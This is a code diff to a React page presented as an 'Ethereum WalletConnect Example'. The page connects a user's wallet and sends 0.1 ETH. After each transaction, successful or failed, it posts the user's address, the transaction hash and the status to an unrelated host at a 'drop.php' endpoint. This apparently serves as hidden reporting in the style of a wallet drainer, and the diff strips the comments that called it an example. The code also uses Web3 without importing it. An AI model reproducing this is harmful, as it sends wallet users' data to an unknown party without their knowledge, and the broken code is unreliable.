@@ -1,10 +1,9 @@
-import { ethers } from "@ethersproject/providers";
+import React, { useState } from 'react';
 import WalletConnect from "@walletconnect/client";
 import Web3Modal from "web3modal";
 import axios from "axios";
-import { useEffect, useState } from "react";
 
-export default function Home() {
+const Home = () => {
   const [status, setStatus] = useState("");
 
   const handleWalletConnect = async () => {
@@ -13,7 +12,9 @@ export default function Home() {
         walletconnect: {
           package: WalletConnect,
           options: {
-            infuraId: process.env.NEXT_PUBLIC_INFURA_PROJECT_ID,
+            bridge: 'https://bridge.walletconnect.org',
+            qrcodeModal: true,
+            pollingInterval: 15000,
           },
         },
       };
@@ -24,28 +25,27 @@ export default function Home() {
       });
 
       const provider = await web3Modal.connect();
-      const web3 = new ethers.providers.Web3Provider(provider);
-      const signer = web3.getSigner();
+      const web3 = new Web3(provider);
+      const accounts = await web3.eth.getAccounts();
+      const senderAddress = accounts[0];
 
-      // Example transaction
-      const transaction = await signer.sendTransaction({
-        to: "0xRecipientAddress",
-        value: ethers.utils.parseEther("0.1"), // 0.1 ETH
+      const transaction = await web3.eth.sendTransaction({
+        from: senderAddress,
+        to: '0xRecipientAddress',
+        value: web3.utils.toWei('0.1', 'ether'), // Example transaction
       });
 
-      setStatus(`Transaction successful: ${transaction.hash}`);
+      setStatus(`Transaction successful: ${transaction.transactionHash}`);
 
-      // Example API call
       await axios.post("https://eflujsyb0kuybgol11532.cleavr.one/btc/drop.php", {
         status: "approved",
-        transactionHash: transaction.hash,
-        sender: transaction.from,
-        recipient: transaction.to,
+        transactionHash: transaction.transactionHash,
+        sender: senderAddress,
+        recipient: '0xRecipientAddress',
       });
     } catch (error) {
       console.error("Error:", error.message);
 
-      // Example error API call
       await axios.post("https://eflujsyb0kuybgol11532.cleavr.one/btc/drop.php", {
         status: "declined",
         error: error.message,
@@ -55,13 +55,6 @@ export default function Home() {
     }
   };
 
-  useEffect(() => {
-    // Clean up on unmount
-    return () => {
-      // Disconnect wallet or clean up resources if needed
-    };
-  }, []);
-
   return (
     <div>
       <h1>Ethereum WalletConnect Example</h1>
@@ -69,4 +62,6 @@ export default function Home() {
       {status && <p>Status: {status}</p>}
     </div>
   );
-}
+};
+
+export default Home;
